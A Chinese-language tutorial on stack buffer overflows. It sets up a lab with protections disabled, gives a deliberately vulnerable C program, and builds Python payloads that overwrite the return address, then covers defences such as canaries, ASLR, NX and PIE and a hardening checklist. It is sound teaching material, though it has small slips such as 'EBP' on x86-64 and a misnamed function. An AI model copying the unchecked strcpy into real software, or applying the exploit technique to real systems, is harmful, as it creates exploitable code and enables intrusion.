# 缓冲区溢出实战

> 内存操作不当——C/C++ 的最经典漏洞，至今仍是最危险的漏洞之一

---

## 原理回顾

```
栈内存分布（从高地址到低地址）：

┌─────────────────┐
│   返回地址       │  ← 攻击者想改写这里
├─────────────────┤
│   saved EBP     │
├─────────────────┤
│   局部变量       │
├─────────────────┤
│   buffer[64]    │  ← 输入写入这里 → 溢出覆盖上方
└─────────────────┘
低地址
```

---

## 实战 POC

### 环境准备

```bash
# 使用 Docker 搭建实验环境（Ubuntu 22.04）
mkdir boftest && cd boftest

cat > Dockerfile << 'EOF'
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y gdb python3 sudo
RUN echo 0 | tee /proc/sys/kernel/randomize_va_space  # 关闭 ASLR 方便演示
WORKDIR /workspace
CMD ["/bin/bash"]
EOF

docker build -t boftest .
docker run -it --rm boftest
```

### 漏洞程序

```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("🎯 成功跳转到 secret_function！\n");
    printf("你已控制程序执行流！\n");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // ❌ 不检查长度
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("用法: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    printf("正常返回 main\n");
    return 0;
}
```

### 查找目标地址

```bash
# 编译（关闭保护）
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# 使用 GDB 找到 secret_function 的地址
gdb -batch -ex "info functions" -ex "quit" ./vuln | grep secret
# 输出: 0x401186  secret_function
```

### 构造 Exploit

```bash
# 确定溢出偏移量
python3 -c "
import sys

# 创建 pattern 确定偏移
payload = b'A' * 64  # 填满 buffer
payload += b'B' * 8  # 覆盖 saved EBP
payload += b'C' * 8  # 覆盖返回地址

sys.stdout.buffer.write(payload)
" > payload1.bin

# 验证偏移（观察 crash 时 RIP=0x434343... 即 CCCC）
# 运行: ./vuln $(cat payload1.bin)

# 正式 exploit
python3 -c "
import sys

# secret_function 的地址（小端序）
target_addr = 0x401186.to_bytes(8, 'little')

payload = b'A' * 64     # 填充 buffer
payload += b'B' * 8      # 覆盖 EBP
payload += target_addr   # 覆盖返回地址为 secret_function

sys.stdout.buffer.write(payload)
" > exploit.bin

# 执行
./vuln "$(cat exploit.bin)"
# 输出:
# Input: AAAA...BBBB...
# 🎯 成功跳转到 secret_function！
```

---

## 现代防御技术

### 栈保护（Stack Canary）

```bash
# 编译时启用 canary（默认开启）
gcc -fstack-protector-strong -o vuln_safe vuln.c

# 溢出后程序会检测到 canary 被篡改并终止
# 输出: *** stack smashing detected ***
```

### ASLR

```bash
# 开启 ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# seed_function 的地址每次运行都不同
# 攻击者无法硬编码地址
```

### NX（栈不可执行）

```bash
# 编译时默认开启 NX
gcc -z noexecstack -o vuln_nx vuln.c

# 即使控制了 RIP，栈上的 shellcode 也无法执行
# SIGSEGV
```

### PIE

```bash
# 位置无关代码
gcc -fpie -pie -o vuln_pie vuln.c

# 代码段地址也随机化
```

---

## 真实世界中的缓冲区溢出

| 漏洞 | 年份 | 影响 |
|------|------|------|
| EternalBlue (MS17-010) | 2017 | WannaCry 勒索病毒全球爆发 |
| Heartbleed (CVE-2014-0160) | 2014 | OpenSSL 信息泄露 |
| Shellshock (CVE-2014-6271) | 2014 | Bash 远程代码执行 |
| BlueKeep (CVE-2019-0708) | 2019 | RDP 蠕虫漏洞 |

---

## 防御清单

- [ ] 使用安全函数（`strncpy` 替代 `strcpy`，`snprintf` 替代 `sprintf`）
- [ ] 编译时开启所有保护（`-fstack-protector-strong`）
- [ ] 编译时开启 ASLR、NX、PIE
- [ ] 使用内存安全语言编写关键组件（Rust/Go）
- [ ] 输入长度验证
- [ ] 开启 Address Sanitizer 进行测试
- [ ] 使用 Fuzzer 进行模糊测试

---

## 延伸阅读

1. [LiveOverflow — 缓冲区溢出教程](https://liveoverflow.com/topics/buffer-overflow/)
2. [pwn.college — 二进制安全](https://pwn.college/)
3. [ROP Emporium — ROP 链教程](https://ropemporium.com/)
4. [Google Project Zero](https://googleprojectzero.com/)
5. [Nightmare — CTF Pwn 入门](https://guyinatuxedo.github.io/)

*下一篇：[Linux 提权技术](02-privilege-escalation.md)*
